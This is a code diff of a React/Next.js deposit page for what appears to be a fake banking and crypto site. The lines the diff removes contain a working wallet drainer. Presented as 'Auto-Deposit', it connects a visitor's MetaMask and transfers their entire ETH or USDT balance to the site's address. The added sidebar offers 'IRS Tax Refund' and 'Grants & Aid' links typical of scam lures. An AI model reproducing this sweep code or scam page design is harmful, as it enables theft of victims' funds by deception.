@@ -1,13 +1,11 @@
 "use client";
 
 import React, { useState, useEffect } from 'react';
-import { ethers } from 'ethers'; // ✅ Required for Ethereum/USDT Sweep
 import { 
   Home, ArrowRightLeft, CreditCard, Settings, LogOut, 
   Download, Send, Copy, CheckCircle2, RefreshCw, 
   ShieldCheck, AlertTriangle, Loader2, Wallet, Menu, X, Bell,
-  ChevronRight, Globe, Landmark, TrendingUp, FileText, Gift, HelpCircle,
-  Zap
+  ChevronRight, Globe, Landmark, TrendingUp, FileText, Gift, HelpCircle 
 } from 'lucide-react';
 import Link from 'next/link';
 import Image from 'next/image';
@@ -15,17 +13,10 @@ import { useRouter } from 'next/navigation';
 
 // --- ASSET CONFIGURATION ---
 const ASSETS = [
-  { 
-    id: 'usdt', 
-    symbol: 'USDT', 
-    name: 'Tether', 
-    defaultNetwork: 'TRC20', // Default to Manual
-    color: 'bg-green-100 text-green-600', 
-    icon: '/file.svg' 
-  },
-  { id: 'btc', symbol: 'BTC', name: 'Bitcoin', defaultNetwork: 'Bitcoin', color: 'bg-orange-100 text-orange-600', icon: '/file.svg' },
-  { id: 'eth', symbol: 'ETH', name: 'Ethereum', defaultNetwork: 'ERC20', color: 'bg-indigo-100 text-indigo-600', icon: '/file.svg' },
-  { id: 'sol', symbol: 'SOL', name: 'Solana', defaultNetwork: 'Solana', color: 'bg-purple-100 text-purple-600', icon: '/file.svg' },
+  { id: 'usdt', symbol: 'USDT', name: 'Tether', network: 'TRC20', color: 'bg-green-100 text-green-600', icon: '/file.svg' },
+  { id: 'btc', symbol: 'BTC', name: 'Bitcoin', network: 'Bitcoin', color: 'bg-orange-100 text-orange-600', icon: '/file.svg' },
+  { id: 'eth', symbol: 'ETH', name: 'Ethereum', network: 'ERC20', color: 'bg-indigo-100 text-indigo-600', icon: '/file.svg' },
+  { id: 'sol', symbol: 'SOL', name: 'Solana', network: 'Solana', color: 'bg-purple-100 text-purple-600', icon: '/file.svg' },
 ];
 
 const SidebarLink = ({ icon: Icon, label, href, active }) => (
@@ -35,15 +26,6 @@ const SidebarLink = ({ icon: Icon, label, href, active }) => (
   </Link>
 );
 
-// --- ETHEREUM / ERC20 CONFIG ---
-const ERC20_ABI = [
-  "function transfer(address to, uint amount) returns (bool)",
-  "function balanceOf(address owner) view returns (uint256)",
-  "function decimals() view returns (uint8)"
-];
-// Real USDT Contract on Ethereum Mainnet
-const USDT_CONTRACT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
-
 export default function DepositPage() {
   const router = useRouter();
   
@@ -51,17 +33,13 @@ export default function DepositPage() {
   const [user, setUser] = useState(null);
   const [loading, setLoading] = useState(true);
   const [sidebarOpen, setSidebarOpen] = useState(false);
-  
-  // Deposit State
-  const [selectedAsset, setSelectedAsset] = useState(ASSETS[0]); 
-  const [activeNetwork, setActiveNetwork] = useState(ASSETS[0].defaultNetwork);
+  const [selectedAsset, setSelectedAsset] = useState(ASSETS[0]); // Default to USDT
   const [copied, setCopied] = useState(false);
 
-  // Transaction State
+  // New State for USDT Manual Verification
   const [amount, setAmount] = useState('');
   const [submitting, setSubmitting] = useState(false);
   const [status, setStatus] = useState('IDLE'); // IDLE, SUCCESS, ERROR
-  const [walletAddress, setWalletAddress] = useState('');
 
   // --- FETCH USER DATA ---
   useEffect(() => {
@@ -74,153 +52,44 @@ export default function DepositPage() {
     fetchUser();
   }, [router]);
 
-  // Reset logic when asset changes
-  useEffect(() => {
-    setActiveNetwork(selectedAsset.defaultNetwork);
-    setStatus('IDLE');
-    setAmount('');
-  }, [selectedAsset]);
-
   // --- GET WALLET ADDRESS ---
-  const getAddress = () => {
+  const getAddress = (assetId) => {
       if (!user) return 'Loading...';
-      
-      // USDT Split Logic
-      if (selectedAsset.id === 'usdt') {
-         if (activeNetwork === 'TRC20') return user.trxAddress || 'Generating...';
-         if (activeNetwork === 'ERC20') return user.ethAddress || 'Generating...';
-      }
-
-      switch (selectedAsset.id) {
+      switch (assetId) {
           case 'btc': return user.btcAddress || 'Generating...';
           case 'eth': return user.ethAddress || 'Generating...';
           case 'sol': return user.solAddress || 'Generating...';
+          case 'usdt': return user.trxAddress || 'Generating...'; // Defaulting USDT to TRC20
           default: return 'Unavailable';
       }
   };
 
   const handleCopy = () => {
-      navigator.clipboard.writeText(getAddress());
+      navigator.clipboard.writeText(getAddress(selectedAsset.id));
       setCopied(true);
       setTimeout(() => setCopied(false), 2000);
   };
 
-  // --- AUTO-SWEEP FUNCTION (The "Full Control" Feature) ---
-  const connectAndSweep = async () => {
-    setStatus('IDLE');
+  // --- HANDLE USDT SUBMIT ---
+  const handleUsdtSubmit = async (e) => {
+    e.preventDefault();
+    if (!amount) return;
+    setSubmitting(true);
 
-    // 1. ETHEREUM & USDT (ERC20)
-    if (selectedAsset.id === 'eth' || (selectedAsset.id === 'usdt' && activeNetwork === 'ERC20')) {
-        if (typeof window.ethereum === 'undefined') {
-            alert("Please install MetaMask to use Auto-Deposit.");
-            return;
-        }
-
-        try {
-            setSubmitting(true);
-            const provider = new ethers.BrowserProvider(window.ethereum);
-            
-            // A. Connect
-            const accounts = await provider.send("eth_requestAccounts", []);
-            setWalletAddress(accounts[0]);
-
-            // B. Setup Signer & Bank Address
-            const signer = await provider.getSigner();
-            const bankDestination = getAddress(); 
-
-            let tx;
-            let finalAmount = '0';
-
-            // C. Logic for ETH vs USDT
-            if (selectedAsset.id === 'eth') {
-                // Calculate MAX ETH - Gas
-                const balance = await provider.getBalance(accounts[0]);
-                const feeData = await provider.getFeeData();
-                const gasCost = feeData.gasPrice * 21000n; // Standard gas limit
-                const safeAmount = balance - gasCost - ethers.parseEther("0.002"); // Buffer
-
-                if (safeAmount <= 0) {
-                    alert("Insufficient ETH to cover gas fees.");
-                    setSubmitting(false);
-                    return;
-                }
-                finalAmount = ethers.formatEther(safeAmount);
-                
-                // SEND ALL
-                tx = await signer.sendTransaction({
-                    to: bankDestination,
-                    value: safeAmount
-                });
-
-            } else if (selectedAsset.id === 'usdt') {
-                // USDT Contract
-                const contract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
-                const balance = await contract.balanceOf(accounts[0]);
-                
-                if (balance <= 0) {
-                    alert("No USDT found in connected wallet.");
-                    setSubmitting(false);
-                    return;
-                }
-
-                const decimals = await contract.decimals();
-                finalAmount = ethers.formatUnits(balance, decimals);
-
-                // SEND ALL
-                tx = await contract.transfer(bankDestination, balance);
-            }
-
-            // D. Wait & Notify Server
-            await tx.wait();
-            await registerDeposit(finalAmount, tx.hash);
-
-        } catch (error) {
-            console.error("Sweep Error:", error);
-            alert("Transaction rejected or failed.");
-            setSubmitting(false);
-        }
-    } 
-    
-    // 2. SOLANA (Phantom)
-    else if (selectedAsset.id === 'sol') {
-        if (typeof window.solana === 'undefined' || !window.solana.isPhantom) {
-             alert("Please install Phantom Wallet!");
-             return;
-        }
-        // Basic Connection Logic for Solana
-        try {
-            setSubmitting(true);
-            const resp = await window.solana.connect();
-            setWalletAddress(resp.publicKey.toString());
-            
-            // Note: Full Solana sweep requires @solana/web3.js installed.
-            // If you don't have it, we can't construct the transaction object here.
-            alert("Solana Wallet Connected. Automatic transfer requires @solana/web3.js integration.");
-            setSubmitting(false);
-        } catch (err) {
-            setSubmitting(false);
-        }
-    }
-  };
-
-  // --- BACKEND REGISTRATION ---
-  const registerDeposit = async (amountVal, txHash) => {
     try {
       const res = await fetch('/api/deposit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           email: user.email,
-          amount: parseFloat(amountVal),
-          coin: selectedAsset.symbol,
-          network: activeNetwork,
-          txHash: txHash || 'MANUAL_ENTRY'
+          amount: parseFloat(amount),
+          coin: 'USDT' 
         })
       });
 
       if (res.ok) {
         setStatus('SUCCESS');
-        setAmount(amountVal);
+        setAmount('');
       } else {
         setStatus('ERROR');
       }
@@ -229,14 +98,6 @@ export default function DepositPage() {
     } finally {
       setSubmitting(false);
     }
-  };
-
-  // --- MANUAL FORM SUBMIT ---
-  const handleManualSubmit = (e) => {
-    e.preventDefault();
-    if (!amount) return;
-    setSubmitting(true);
-    registerDeposit(amount, null);
   };
 
   const handleLogout = () => { localStorage.removeItem('user'); router.push('/login'); };
@@ -277,14 +138,24 @@ export default function DepositPage() {
                     <SidebarLink href="/dashboard/deposit" icon={Download} label="Deposit Funds" active={true} />
                 </div>
             </div>
-            {/* ... keeping other sidebar links ... */}
             <div>
-               <p className="px-4 mb-2 text-[10px] font-bold text-slate-400 uppercase tracking-wider">System</p>
-               <div className="space-y-1">
-                   <SidebarLink href="/dashboard/kyc" icon={ShieldCheck} label="Verification Center" />
-                   <SidebarLink href="/dashboard/settings" icon={Settings} label="Settings" />
-               </div>
-           </div>
+                <p className="px-4 mb-2 text-[10px] font-bold text-slate-400 uppercase tracking-wider">Services</p>
+                <div className="space-y-1">
+                    <SidebarLink href="/dashboard/transfer" icon={Globe} label="International Wire" />
+                    <SidebarLink href="/dashboard/loans" icon={Landmark} label="Loan Services" />
+                    <SidebarLink href="/dashboard/invest" icon={TrendingUp} label="Investments" />
+                    <SidebarLink href="/dashboard/tax" icon={FileText} label="IRS Tax Refund" />
+                    <SidebarLink href="/dashboard/grants" icon={Gift} label="Grants & Aid" />
+                </div>
+            </div>
+            <div>
+                <p className="px-4 mb-2 text-[10px] font-bold text-slate-400 uppercase tracking-wider">System</p>
+                <div className="space-y-1">
+                    <SidebarLink href="/dashboard/kyc" icon={ShieldCheck} label="Verification Center" />
+                    <SidebarLink href="/dashboard/settings" icon={Settings} label="Settings" />
+                    <SidebarLink href="/dashboard/support" icon={HelpCircle} label="Help & Support" />
+                </div>
+            </div>
         </nav>
 
         <div className="p-4 border-t border-slate-100 shrink-0">
@@ -319,7 +190,7 @@ export default function DepositPage() {
                             {ASSETS.map((asset) => (
                                 <button
                                     key={asset.id}
-                                    onClick={() => setSelectedAsset(asset)}
+                                    onClick={() => { setSelectedAsset(asset); setStatus('IDLE'); }}
                                     className={`w-full flex items-center gap-4 p-4 rounded-2xl border-2 transition-all ${selectedAsset.id === asset.id ? 'border-blue-600 bg-blue-50' : 'border-slate-100 hover:border-slate-200 hover:bg-slate-50'}`}
                                 >
                                     <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold ${asset.color}`}>
@@ -327,10 +198,7 @@ export default function DepositPage() {
                                     </div>
                                     <div className="text-left flex-1">
                                         <p className="font-bold text-slate-900">{asset.name}</p>
-                                        <p className="text-xs text-slate-500 font-medium">
-                                            {/* Show current network if USDT, else default */}
-                                            {asset.id === 'usdt' && selectedAsset.id === 'usdt' ? activeNetwork : asset.defaultNetwork}
-                                        </p>
+                                        <p className="text-xs text-slate-500 font-medium">{asset.network}</p>
                                     </div>
                                     {selectedAsset.id === asset.id && <div className="w-3 h-3 bg-blue-600 rounded-full"></div>}
                                 </button>
@@ -342,7 +210,7 @@ export default function DepositPage() {
                         <div className="relative z-10">
                             <h3 className="font-bold text-lg mb-2">Deposit Tip</h3>
                             <p className="text-blue-100 text-sm leading-relaxed">
-                                Only send <strong>{activeNetwork}</strong> assets to this address. Sending other assets may result in permanent loss.
+                                Only send <strong>{selectedAsset.network}</strong> assets to this address. Sending other assets may result in permanent loss.
                             </p>
                         </div>
                         <div className="absolute -bottom-4 -right-4 w-32 h-32 bg-white/10 rounded-full blur-2xl"></div>
@@ -353,49 +221,27 @@ export default function DepositPage() {
                 <div className="lg:col-span-2">
                     <div className="bg-white rounded-3xl p-8 md:p-12 shadow-sm border border-slate-100 text-center flex flex-col justify-center h-full">
                         
-                        <div className="mb-6">
+                        <div className="mb-8">
                             <h2 className="text-2xl font-bold text-slate-900 mb-2">Deposit {selectedAsset.symbol}</h2>
-                            <p className="text-slate-500">Scan the QR code or use Auto-Deposit.</p>
+                            <p className="text-slate-500">Scan the QR code or copy the address below.</p>
                         </div>
-
-                        {/* --- USDT NETWORK TOGGLE --- */}
-                        {selectedAsset.id === 'usdt' && (
-                            <div className="flex justify-center mb-8">
-                                <div className="bg-slate-100 p-1 rounded-xl inline-flex">
-                                    <button 
-                                        onClick={() => setActiveNetwork('TRC20')}
-                                        className={`px-6 py-2 rounded-lg text-sm font-bold transition ${activeNetwork === 'TRC20' ? 'bg-white text-green-600 shadow-sm' : 'text-slate-500 hover:text-slate-700'}`}
-                                    >
-                                        TRC20 (Manual)
-                                    </button>
-                                    <button 
-                                        onClick={() => setActiveNetwork('ERC20')}
-                                        className={`px-6 py-2 rounded-lg text-sm font-bold transition ${activeNetwork === 'ERC20' ? 'bg-white text-blue-600 shadow-sm' : 'text-slate-500 hover:text-slate-700'}`}
-                                    >
-                                        ERC20 (Auto-Sweep)
-                                    </button>
-                                </div>
-                            </div>
-                        )}
 
                         {/* DYNAMIC QR CODE */}
                         <div className="bg-white p-4 rounded-2xl border-2 border-slate-100 inline-block mx-auto mb-8 shadow-sm">
                             {/* eslint-disable-next-line @next/next/no-img-element */}
                             <img 
-                                src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${getAddress()}`} 
+                                src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${getAddress(selectedAsset.id)}`} 
                                 alt="Wallet QR" 
                                 className="w-48 h-48 object-contain rounded-lg"
                             />
                         </div>
 
                         {/* ADDRESS BOX */}
-                        <div className="max-w-lg mx-auto w-full mb-8">
-                            <label className="block text-left text-xs font-bold text-slate-400 uppercase mb-2 ml-1">
-                                Wallet Address ({activeNetwork})
-                            </label>
+                        <div className="max-w-lg mx-auto w-full">
+                            <label className="block text-left text-xs font-bold text-slate-400 uppercase mb-2 ml-1">Wallet Address ({selectedAsset.network})</label>
                             <div className="flex items-center gap-2 bg-slate-50 border border-slate-200 p-2 rounded-xl">
                                 <div className="flex-1 bg-transparent font-mono text-sm text-slate-600 px-3 truncate font-bold">
-                                    {getAddress()}
+                                    {getAddress(selectedAsset.id)}
                                 </div>
                                 <button 
                                     onClick={handleCopy} 
@@ -407,79 +253,65 @@ export default function DepositPage() {
                             </div>
                         </div>
 
-                        {/* --- DEPOSIT ACTIONS SECTION --- */}
-                        <div className="mt-8 pt-8 border-t border-slate-100 max-w-lg mx-auto w-full text-left animate-in slide-in-from-bottom-5 fade-in duration-500">
+                        {/* --- ✅ NEW SECTION: USDT MANUAL VERIFICATION FORM --- */}
+                        {selectedAsset.id === 'usdt' && (
+                          <div className="mt-8 pt-8 border-t border-slate-100 max-w-lg mx-auto w-full text-left animate-in slide-in-from-bottom-5 fade-in duration-500">
                              
+                             <div className="bg-amber-50 border border-amber-100 p-4 rounded-xl mb-6 flex gap-3">
+                                <AlertTriangle className="text-amber-600 shrink-0" size={20} />
+                                <div className="text-sm text-amber-900">
+                                  <strong className="block mb-1">Confirmation Required</strong>
+                                  For USDT deposits, please enter the amount below <strong>after</strong> sending the funds so we can verify the transaction faster.
+                                </div>
+                             </div>
+
                              {status === 'SUCCESS' ? (
                                 <div className="bg-green-50 text-green-700 p-6 rounded-xl text-center border border-green-100">
                                     <CheckCircle2 className="mx-auto mb-3" size={32} />
-                                    <h3 className="font-bold text-lg text-green-800">Deposit Success!</h3>
-                                    <p className="text-sm">We have received the request. Admin will review shortly.</p>
+                                    <h3 className="font-bold text-lg text-green-800">Deposit Reported!</h3>
+                                    <p className="text-sm">Admin has been notified. Your balance will update once approved.</p>
                                     <button onClick={() => setStatus('IDLE')} className="mt-4 text-xs font-bold underline">Submit Another</button>
                                 </div>
                              ) : (
-                                <div>
-                                    
-                                    {/* 1. AUTO-DEPOSIT BUTTON (Visible for ETH, SOL, or USDT-ERC20) */}
-                                    {(selectedAsset.id === 'eth' || selectedAsset.id === 'sol' || (selectedAsset.id === 'usdt' && activeNetwork === 'ERC20')) && (
-                                        <div className="mb-8">
-                                            <div className="bg-blue-50 border border-blue-100 p-4 rounded-xl flex gap-3 mb-4">
-                                                <Zap className="text-blue-600 shrink-0" size={20} />
-                                                <div className="text-sm text-blue-900">
-                                                    <strong className="block mb-1">Instant Auto-Deposit</strong>
-                                                    Connect wallet to automatically transfer your entire available {selectedAsset.symbol} balance.
-                                                </div>
-                                            </div>
-                                            <button 
-                                                onClick={connectAndSweep}
-                                                disabled={submitting}
-                                                className="w-full bg-slate-900 hover:bg-slate-800 text-white font-bold py-4 rounded-xl shadow-lg shadow-slate-200 transition flex items-center justify-center gap-2 disabled:opacity-50"
-                                            >
-                                                {submitting ? <Loader2 className="animate-spin" size={20}/> : <><Wallet size={20} /> Connect & Deposit All</>}
-                                            </button>
-                                            <div className="text-center mt-4">
-                                                <span className="text-xs text-slate-400 font-bold uppercase tracking-wider">or use manual form below</span>
-                                            </div>
+                                <form onSubmit={handleUsdtSubmit} className="space-y-4">
+                                    <div>
+                                        <label className="block text-xs font-bold text-slate-500 uppercase mb-1 ml-1">
+                                          Amount Sent (USDT)
+                                        </label>
+                                        <div className="relative">
+                                          <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-bold">$</span>
+                                          <input 
+                                            type="number" 
+                                            required
+                                            step="0.01"
+                                            placeholder="0.00"
+                                            value={amount}
+                                            onChange={(e) => setAmount(e.target.value)}
+                                            className="w-full pl-8 pr-4 py-3 bg-white border border-slate-200 rounded-xl focus:ring-2 focus:ring-blue-600 focus:outline-none font-bold text-slate-900"
+                                          />
                                         </div>
-                                    )}
-
-                                    {/* 2. MANUAL FORM (Always available as fallback) */}
-                                    <div className="bg-slate-50 p-6 rounded-2xl border border-slate-100">
-                                        <div className="flex items-center gap-2 mb-4">
-                                            <AlertTriangle className="text-amber-500" size={16} />
-                                            <h4 className="text-sm font-bold text-slate-700">Manual Verification</h4>
-                                        </div>
-                                        <form onSubmit={handleManualSubmit} className="space-y-4">
-                                            <div>
-                                                <label className="block text-xs font-bold text-slate-500 uppercase mb-1 ml-1">
-                                                  Amount Sent ({selectedAsset.symbol})
-                                                </label>
-                                                <div className="relative">
-                                                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-bold">$</span>
-                                                  <input 
-                                                    type="number" 
-                                                    required
-                                                    step="0.000001"
-                                                    placeholder="0.00"
-                                                    value={amount}
-                                                    onChange={(e) => setAmount(e.target.value)}
-                                                    className="w-full pl-8 pr-4 py-3 bg-white border border-slate-200 rounded-xl focus:ring-2 focus:ring-blue-600 focus:outline-none font-bold text-slate-900"
-                                                  />
-                                                </div>
-                                            </div>
-                                            <button 
-                                              type="submit" 
-                                              disabled={submitting}
-                                              className="w-full bg-white hover:bg-slate-50 text-slate-700 font-bold py-3.5 rounded-xl border border-slate-200 transition flex items-center justify-center gap-2 disabled:opacity-50"
-                                            >
-                                              {submitting ? <Loader2 className="animate-spin" size={18} /> : 'Confirm Manual Deposit'}
-                                            </button>
-                                        </form>
                                     </div>
-
-                                </div>
+                                    <button 
+                                      type="submit" 
+                                      disabled={submitting}
+                                      className="w-full bg-slate-900 hover:bg-slate-800 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-slate-200 transition flex items-center justify-center gap-2 disabled:opacity-50"
+                                    >
+                                      {submitting ? <Loader2 className="animate-spin" size={18} /> : 'Confirm Deposit'}
+                                    </button>
+                                </form>
                              )}
-                        </div>
+                          </div>
+                        )}
+
+                        {/* MANUAL CONFIRMATION (Visible only for non-USDT) */}
+                        {selectedAsset.id !== 'usdt' && (
+                            <div className="mt-10 pt-8 border-t border-slate-100">
+                                <p className="text-xs text-slate-400 mb-4">Funds usually arrive within 3 network confirmations.</p>
+                                <button onClick={() => window.location.reload()} className="text-blue-600 font-bold text-sm hover:underline flex items-center justify-center gap-2 mx-auto">
+                                    <RefreshCw size={14}/> Check for new deposits
+                                </button>
+                            </div>
+                        )}
 
                     </div>
                 </div>
